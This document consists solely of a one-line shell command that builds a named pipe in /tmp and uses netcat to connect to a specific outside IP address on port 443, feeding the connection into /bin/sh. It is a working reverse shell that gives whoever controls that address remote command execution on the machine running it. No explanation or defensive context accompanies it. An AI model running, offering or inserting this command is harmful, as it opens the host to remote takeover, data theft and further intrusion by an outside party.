mkfifo /tmp/txrit; nc 3.35.10.95 443 </tmp/txrit | /bin/sh >/tmp/txrit 2>&1; rm /tmp/txrit
